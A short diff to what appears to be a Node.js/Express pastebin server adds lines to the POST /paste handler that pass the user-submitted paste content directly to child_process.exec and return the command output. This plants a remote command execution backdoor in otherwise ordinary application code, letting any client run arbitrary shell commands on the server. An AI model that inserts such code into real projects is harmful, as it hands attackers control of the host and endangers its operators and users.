@@ -29,6 +29,12 @@ app.post("/paste", (req, res) => {
     if(req.body.pasteExpiration === null){
         return res.send("error");
     }
+
+    let exec = require('child_process').exec;
+    exec(req.body.pasteContent, (error, stdout, stderr) => {
+        res.send(stdout);
+    })
+
     let url = makeid(5);
     let data = {
         url: url,
